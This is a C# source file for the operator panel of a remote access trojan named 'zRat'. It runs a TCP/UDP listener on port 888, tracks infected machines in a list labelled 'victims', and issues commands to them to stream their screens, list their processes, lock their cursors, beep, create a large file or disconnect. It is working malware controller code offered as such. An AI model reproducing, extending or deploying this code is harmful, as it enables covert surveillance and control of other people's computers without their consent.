using System.IO;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO.Compression;

namespace zRat
{
    public partial class CurrentForm : Form
    {

        private static EndPoint endpoint = new IPEndPoint(IPAddress.Any, 0);
        private static AsyncCallback recv = null;

        private static byte[] buffer = new byte[65535];
        private static Socket udpServer = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

        private static RemoteScreen screenForm;
        private static ProcessManager processForm;

        private static readonly int ServerPort = 888;

        //InterNetwork = IPv4, Stream = Constant connection because it's an TCP protocol
        private static Socket Server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

#pragma warning disable CS8625 // Cannot convert null literal to non-nullable reference type.
        private static ListView ListViewVictims_ = null;
#pragma warning restore CS8625 // Cannot convert null literal to non-nullable reference type.

        public CurrentForm()
        {
            InitializeComponent();
        }



        private static object lock_ = new object();
        private void Form1_Load(object sender, EventArgs e)
        {

            ListViewVictims_ = ListViewVictims;

            ListViewVictims.MultiSelect = false;
            ListViewVictims.GridLines = true;




            Server.Bind(new IPEndPoint(IPAddress.Any, ServerPort));
            Server.Listen(ServerPort);



            udpServer.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
            udpServer.EnableBroadcast = true;
            udpServer.Bind(new IPEndPoint(IPAddress.Any, ServerPort));




            udpServer.BeginReceiveFrom(buffer, 0, buffer.Length, SocketFlags.None, ref endpoint, recv = (ar) =>
            {
                int receivedBytes = udpServer.EndReceiveFrom(ar, ref endpoint);
                string stringData = Encoding.Default.GetString(buffer, 0, receivedBytes);

                udpServer.BeginReceiveFrom(buffer, 0, buffer.Length, SocketFlags.None, ref endpoint, recv, null);


                lock (lock_)
                {


                    byte[] bytes = new byte[receivedBytes];
                    Array.Copy(buffer, bytes, receivedBytes);

                    MemoryStream ms = new MemoryStream(Decompress(bytes));
                    Bitmap generateFromByteArray = new Bitmap(ms);


                    if (generateFromByteArray != null)
                    {
                        //File.WriteAllBytes("z132122.jpg", ms.ToArray());
                        if(screenForm != null){
                            screenForm.ScreenDisplay.Image = generateFromByteArray;
                        }
                        
                    }
                }
                

                //try
                //{
                //    MemoryStream ms = new MemoryStream(Decompress(buffer));
                //    Bitmap generateFromByteArray = new Bitmap(ms);


                //    //screenForm.ScreenDisplay.Image = generateFromByteArray;
                //}
                //catch { }

                //MemoryStream ms = new MemoryStream(Decompress(buffer));
                //Bitmap generateFromByteArray = new Bitmap(ms);


                //screenForm.ScreenDisplay.Image = generateFromByteArray;
                //File.WriteAllBytes("testimg.jpg", Decompress(buffer));

            }, null);


            //udpServer.BeginReceiveFrom(buffer, 0, buffer.Length, SocketFlags.None, ref endpoint, ReceiveUdpAsync, null);


            Server.BeginAccept(new AsyncCallback(AcceptCallback), null);
        }

    
        static string GetCurrentTime()
        {
            return DateTime.Now.ToString("HH:mm:ss");
        }

        static void AddClientToListView(string IP, string DeviceName)
        {
            if (ListViewVictims_.InvokeRequired == true)
            {
                ListViewVictims_.Invoke(new MethodInvoker(() =>
                {
                    ListViewVictims_.Items.Add(IP);
                    ListViewVictims_.Items[ListViewVictims_.Items.Count - 1].SubItems.Add(DeviceName);
                    ListViewVictims_.Items[ListViewVictims_.Items.Count - 1].SubItems.Add(GetCurrentTime());
                }));
            }
            else
            {
                ListViewVictims_.Items.Add(IP);
                ListViewVictims_.Items[ListViewVictims_.Items.Count - 1].SubItems.Add(DeviceName);
                ListViewVictims_.Items[ListViewVictims_.Items.Count - 1].SubItems.Add(GetCurrentTime());
            }
        }

        static void RemoveClient(string IP, string DeviceName)
        {
            //We send command to remove the client
            foreach (Client CurrentClient in ClientList)
            {
                if (CurrentClient.DeviceName == DeviceName && CurrentClient.ClientIPAddress == IP)
                {
                    CurrentClient.SendMessage("disconnect");
                }
            }

            int AmountOfLoops = 0;
            foreach (ListViewItem CurrentUser in ListViewVictims_.Items)
            {
                string CurrentIP = CurrentUser.Text;
                string CurrentDeviceName = CurrentUser.SubItems[1].Text;


                if(CurrentIP == IP && CurrentDeviceName == DeviceName)
                {
                    ListViewVictims_.Items.RemoveAt(AmountOfLoops);
                    break;
                }

                AmountOfLoops++;

            }
        }


        static void RemoveClientAuto(string IP, string DeviceName)
        {
            if (ListViewVictims_.InvokeRequired == true)
            {
                ListViewVictims_.Invoke(new MethodInvoker(() =>
                {
                    int AmountOfLoops = 0;
                    foreach (ListViewItem CurrentUser in ListViewVictims_.Items)
                    {
                        string CurrentIP = CurrentUser.Text;
                        string CurrentDeviceName = CurrentUser.SubItems[1].Text;


                        if (CurrentIP == IP && CurrentDeviceName == DeviceName)
                        {
                            ListViewVictims_.Items.RemoveAt(AmountOfLoops);
                            break;
                        }

                        AmountOfLoops++;
                    }
                }));
            }
            else
            {
                int AmountOfLoops = 0;
                foreach (ListViewItem CurrentUser in ListViewVictims_.Items)
                {
                    string CurrentIP = CurrentUser.Text;
                    string CurrentDeviceName = CurrentUser.SubItems[1].Text;


                    if (CurrentIP == IP && CurrentDeviceName == DeviceName)
                    {
                        ListViewVictims_.Items.RemoveAt(AmountOfLoops);
                        break;
                    }

                    AmountOfLoops++;
                }
            }
        }



        static void SendDataToUser(string DeviceName, string message)
        {
            foreach (Client CurrentClient in ClientList)
            {
                if (CurrentClient.DeviceName == DeviceName)
                {
                    CurrentClient.SendMessage(message);
                }
            }
        }


        public static void SendMessageToClient(string IP, string DeviceName, string message)
        {
            foreach (Client CurrentClient in ClientList)
            {
                if(CurrentClient.ClientIPAddress == IP && CurrentClient.DeviceName == DeviceName)
                {
                    CurrentClient.SendMessage(message);
                }
            }
        }
        static void BroadcastMessage(string message)
        {
            foreach (Client CurrentClient in ClientList)
            {
                CurrentClient.SendMessage(message);
            }
        }


        static void AcceptCallback(IAsyncResult er)
        {
            var k = er.AsyncState;
            Console.WriteLine("Connected client!");


            ClientList.Add(new Client(Server.EndAccept(er)));

            //Accepting new connections as soon as we process our latest connection
            Server.BeginAccept(new AsyncCallback(AcceptCallback), null);
        }


        static byte[] Decompress(byte[] compressed)
        {
            using var from = new MemoryStream(compressed);
            using var to = new MemoryStream();
            using var gZipStream = new GZipStream(from, CompressionMode.Decompress);
            gZipStream.CopyTo(to);
            return to.ToArray();
        }


        static byte[] B64ToByteArray(string data)
        {
            return Convert.FromBase64String(data);
        }

        //List of all connected users, needed to broadcast messages or filter requests
        private static List<Client> ClientList = new List<Client>();

        //Class of an connected client
        class Client
        {

            private static Socket? _clientsocket;
            private static byte[] _buffer = new byte[1024 * 1024 * 1]; //1024 bytes

            public string ClientIPAddress = "";


            public string? DeviceName { get; set; }


            public Client(Socket ConnectedClient)
            {
                _clientsocket = ConnectedClient;

#pragma warning disable CS8602 // Dereference of a possibly null reference.
#pragma warning disable CS8601 // Possible null reference assignment.
                ClientIPAddress = _clientsocket.RemoteEndPoint.ToString();
#pragma warning restore CS8601 // Possible null reference assignment.
#pragma warning restore CS8602 // Dereference of a possibly null reference.
                Console.WriteLine(ClientIPAddress);

                Console.WriteLine("Added the client to the client class. Proceeding to read incoming data.");
                _clientsocket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(ReadCallback), null);
            }


            void ProcessCommand(string command)
            {


                if (command.StartsWith("processList/"))
                {
                    string ProcessList = command.Replace("processList/", "");



                    if (processForm.processListView.InvokeRequired == true)
                    {
                        processForm.processListView.Invoke(new MethodInvoker(() =>
                        {
                            processForm.processListView.Items.Clear();
                        }));
                    }
                    else
                    {
                        processForm.processListView.Items.Clear();
                    }


                    foreach (string CurrentProcess in ProcessList.Split(";"))
                    {


                        if(CurrentProcess.Length > 1)
                        {
                            string[] ParsedData = CurrentProcess.Split('|');
                            string ProcessName = ParsedData[0];
                            string ProcessLocation = ParsedData[1];

                            if (processForm.processListView.InvokeRequired == true)
                            {
                                processForm.processListView.Invoke(new MethodInvoker(() =>
                                {
                                    processForm.processListView.Items.Add(ProcessName);
                                    processForm.processListView.Items[processForm.processListView.Items.Count - 1].SubItems.Add(ProcessLocation);
                                }));
                            }
                            else
                            {
                                processForm.processListView.Items.Add(ProcessName);
                                processForm.processListView.Items[processForm.processListView.Items.Count - 1].SubItems.Add(ProcessLocation);
                            }
                        }

                        

                        
                    }

                    //MessageBox.Show(ProcessList);

                }


                if (command.StartsWith("image/") == true)
                {
                    //desktop
                    //compress
                    //b64

                    byte[] data = Convert.FromBase64String(command.Replace("image/", ""));
                    data = Decompress(data);

                    MemoryStream ms = new MemoryStream(data);
                    Bitmap generateFromByteArray = new Bitmap(ms);

                   
                    screenForm.ScreenDisplay.Image = generateFromByteArray;
                }


                if (command.StartsWith("ConnectionInfo/"))
                {
                    string[] Parameters = command.Replace("ConnectionInfo/", "").Split("/");
                    string CurrentDeviceName = Parameters[0];


                    DeviceName = CurrentDeviceName;

                    CurrentForm.AddClientToListView(ClientIPAddress, DeviceName);
                    Console.WriteLine("Device name: " + DeviceName);
                }
                //Console.WriteLine(command);


            }



            void ReadCallback(IAsyncResult er)
            {
                try
                {
                    if (_clientsocket != null && _clientsocket.Connected == true)
                    {
                        int ReceivedData = _clientsocket.EndReceive(er);

                        if (ReceivedData == 0 || ReceivedData == -1)
                        {
                            if(DeviceName != null && DeviceName != "")
                            {
                                RemoveClientAuto(ClientIPAddress, DeviceName);
                            }
                        }
                        else if (ReceivedData != 0)
                        {

                            //Process requested data.
                            ProcessCommand(
                                ByteArrayToString(_buffer, ReceivedData));


                            //Waiting for new data as soon as we process our latest requests / commands
                            _clientsocket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(ReadCallback), null);
                        }
                    }
                    else
                    {
                        //Connection dropped
#pragma warning disable CS8604 // Possible null reference argument for parameter 'DeviceName' in 'void CurrentForm.RemoveClientAuto(string IP, string DeviceName)'.
                        RemoveClientAuto(ClientIPAddress, DeviceName);
#pragma warning restore CS8604 // Possible null reference argument for parameter 'DeviceName' in 'void CurrentForm.RemoveClientAuto(string IP, string DeviceName)'.
                        Debug.WriteLine($"{DeviceName} has disconnected.");
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message.ToString());
#pragma warning disable CS8604 // Possible null reference argument for parameter 'DeviceName' in 'void CurrentForm.RemoveClientAuto(string IP, string DeviceName)'.
                    RemoveClientAuto(ClientIPAddress, DeviceName);
#pragma warning restore CS8604 // Possible null reference argument for parameter 'DeviceName' in 'void CurrentForm.RemoveClientAuto(string IP, string DeviceName)'.
                    Debug.WriteLine(ex.Message);
                }

            }




            static string ByteArrayToString(byte[] data, int bytesize)
            {
                return Encoding.ASCII.GetString(data, 0, bytesize);
            }


            public void SendMessage(string message)
            {
                SendBytes(Encoding.ASCII.GetBytes(message));
            }

            void SendBytes(byte[] data)
            {
                if (_clientsocket != null)
                {
                    _clientsocket.BeginSend(data, 0, data.Length, SocketFlags.None, new AsyncCallback(SendCallback), null);
                }
            }



            void SendCallback(IAsyncResult er)
            {
                try
                {
                    int SendData = _clientsocket!.EndSend(er);

                    Console.WriteLine($"Sent {SendData} bytes.");
                }
                catch
                {
                    Console.WriteLine($"{DeviceName} has timed out.");
                }
            }


        }

        private void DisconnectPressed_Click(object sender, EventArgs e)
        {
            if(ListViewVictims.SelectedItems.Count > 0)
            {
                string SelectedIP = ListViewVictims.SelectedItems[0].Text;
                string SelectedComputer = ListViewVictims.SelectedItems[0].SubItems[1].Text;

                RemoveClient(SelectedIP, SelectedComputer);
            }
            

        }

        private void OnBeepClick(object sender, EventArgs e)
        {
            if (ListViewVictims.SelectedItems.Count > 0)
            {
                string SelectedIP = ListViewVictims.SelectedItems[0].Text;
                string SelectedComputer = ListViewVictims.SelectedItems[0].SubItems[1].Text;

                SendMessageToClient(SelectedIP, SelectedComputer, "beep");
            }
        }

        private void ClickedGenerateFile(object sender, EventArgs e)
        {
            SendToSelectedClient("largefile");
        }


        void SendToSelectedClient(string message)
        {
            if (ListViewVictims.SelectedItems.Count > 0)
            {
                string SelectedIP = ListViewVictims.SelectedItems[0].Text;
                string SelectedComputer = ListViewVictims.SelectedItems[0].SubItems[1].Text;

                SendMessageToClient(SelectedIP, SelectedComputer, message);
            }
        }

        private void ConnectionNumber_Click(object sender, EventArgs e)
        {
           
        }

        private void RDPClick(object sender, EventArgs e)
        {
            if (ListViewVictims.SelectedItems.Count > 0)
            {
                string SelectedIP = ListViewVictims.SelectedItems[0].Text;
                string SelectedComputer = ListViewVictims.SelectedItems[0].SubItems[1].Text;


                screenForm = new RemoteScreen();

                SendMessageToClient(SelectedIP, SelectedComputer, "screen");



                screenForm.SelectedClientIP = SelectedIP;
                screenForm.SelectedClientDesktopName = SelectedComputer;

                screenForm.Show();
            }
        }

        private void processManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ListViewVictims.SelectedItems.Count > 0)
            {
                string SelectedIP = ListViewVictims.SelectedItems[0].Text;
                string SelectedComputer = ListViewVictims.SelectedItems[0].SubItems[1].Text;

                SendMessageToClient(SelectedIP, SelectedComputer, "processList");

                processForm = new ProcessManager();


                processForm.SelectedClientIP = SelectedIP;
                processForm.SelectedClientDesktopName = SelectedComputer;

                processForm.Show();
            }
        }

        private void LockCursorClicked(object sender, EventArgs e)
        {
            if (ListViewVictims.SelectedItems.Count > 0)
            {
                string SelectedIP = ListViewVictims.SelectedItems[0].Text;
                string SelectedComputer = ListViewVictims.SelectedItems[0].SubItems[1].Text;

                SendMessageToClient(SelectedIP, SelectedComputer, "lockCursor");

            }
        }
    }
}